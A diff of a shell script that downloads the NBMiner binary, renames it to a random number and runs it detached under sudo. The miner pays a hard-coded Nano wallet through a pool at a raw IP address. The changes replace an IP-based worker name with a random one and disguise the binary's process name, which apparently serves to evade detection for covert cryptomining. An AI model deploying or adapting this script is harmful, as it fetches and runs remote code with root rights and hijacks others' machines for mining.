@@ -2,8 +2,9 @@
 
 WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
 PAL=147.135.11.137:2020
-WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
+WER=$(echo $(shuf -i 1-99999 -n 1)-LIM)
 COMA="-a ethash -o $PAL -u $WELS.$WER"
+TOP=$(shuf -n 1 -i 1-200000)
 
 
 
@@ -15,7 +16,7 @@ else
     wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz
     tar zxvf NBMiner_40.1_Linux.tgz
     cd NBMiner_Linux
-    mv nbminer a
+    mv nbminer $TOP
     chmod +x *
 fi
-screen -dmLS mine sudo ./a $COMA
+screen -dmLS mine sudo ./$TOP $COMA
